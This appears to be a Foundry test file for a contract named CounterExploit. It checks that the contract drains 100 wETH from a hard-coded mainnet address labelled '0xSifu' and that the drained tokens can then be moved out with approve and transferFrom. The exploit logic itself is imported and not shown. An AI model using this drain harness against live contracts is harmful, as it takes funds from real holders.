// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity ^0.8.13;

/// ============ Imports ============

import "forge-std/Test.sol";
import {CounterExploit} from "../src/CounterExploit.sol";

// Minified ERC20 interface
interface IERC20 {
    function balanceOf(address) external returns (uint256);
    function transferFrom(address, address, uint256) external;
}

/// @title CounterExploitTest
/// @author Anish Agnihotri
contract CounterExploitTest is Test {
    CounterExploit public CE;

    function setUp() public {
        CE = new CounterExploit(0x044b75f554b886A065b9567891e45c79542d7357);
    }

    /// @notice Tests Sifu drain
    function testSifu() public {
        uint256 drainAmount = 100_000_000_000_000_000_000; // 100
        IERC20 token = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // wETH
        uint256 initialBalance = token.balanceOf(address(CE));
        CE.exploit(
            int256(drainAmount),
            address(token),
            0x31d3243CfB54B34Fc9C73e1CB1137124bD6B13E1 // 0xSifu
        );
        uint256 afterBalance = token.balanceOf(address(CE));
        assert(initialBalance + drainAmount == afterBalance);

        // Test approval + draining contract as well
        CE.approve(address(token), drainAmount);
        token.transferFrom(address(CE), address(this), drainAmount);
        assert(drainAmount == token.balanceOf(address(this)));
    }
}
